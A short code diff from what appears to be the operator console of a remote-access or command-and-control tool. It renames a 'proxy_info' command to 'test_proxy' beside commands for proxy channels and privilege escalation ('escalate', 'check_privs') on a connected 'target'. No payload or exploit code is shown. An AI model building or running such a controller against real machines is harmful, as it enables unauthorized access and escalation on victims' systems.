@@ -113,7 +113,7 @@ def target_communication():
     print("   start_proxy            - Start proxy channel (auto new random port)")
     print("   stop_proxy             - Stop proxy channel")
     print("   proxy_status           - Get proxy status")
-    print("   proxy_info             - Show detailed connection info")
+    print("   test_proxy             - Test if proxy is responding")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -280,7 +280,7 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'proxy_info']:
+        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'test_proxy']:
             # Handle proxy commands
             result = reliable_recv()
             if command == 'start_proxy':
@@ -291,10 +291,8 @@ def target_communication():
                 print(f"proxy Status:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-            elif command == 'proxy_info':
-                print(f"proxy Info:\n{'-'*40}")
-                print(result)
-                print("-"*40)
+            elif command == 'test_proxy':
+                print(f"Proxy Test: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
